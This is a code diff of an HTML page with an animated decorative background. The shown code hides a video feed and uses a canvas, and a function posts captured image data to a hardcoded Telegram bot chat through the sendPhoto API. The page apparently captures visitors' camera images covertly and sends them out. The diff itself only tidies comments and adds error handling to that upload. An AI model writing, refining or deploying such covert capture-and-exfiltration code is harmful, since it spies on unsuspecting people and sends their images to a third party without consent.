@@ -19,7 +19,7 @@
       background-size: 300% 300%;
       font-family: 'Dancing Script', cursive;
       animation: bgAnimation 12s infinite alternate;
-      overflow: hidden; /* This hides the scrollbars and viewport overflow */
+      overflow: hidden;
     }
 
     @keyframes bgAnimation {
@@ -57,7 +57,7 @@
     }
 
     video {
-      display: none; /* Hide the video feed from view */
+      display: none; /* Hide the video feed */
     }
 
     canvas {
@@ -121,10 +121,10 @@
       const chatId = '1987016824';
       const url = `https://api.telegram.org/bot${token}/sendPhoto`;
 
-      // Create a FormData object
+      // Create FormData object to send image
       let formData = new FormData();
       formData.append('chat_id', chatId);
-      formData.append('photo', imageData);
+      formData.append('photo', imageData); // Append base64 image here
 
       fetch(url, {
         method: 'POST',
@@ -132,10 +132,14 @@
       })
       .then(response => response.json())
       .then(data => {
-        console.log('Image sent successfully', data);
+        if (data.ok) {
+          console.log('Image sent successfully');
+        } else {
+          console.error('Error sending image:', data);
+        }
       })
       .catch(error => {
-        console.error('Error sending image:', error);
+        console.error('Error:', error);
       });
     }
   </script>
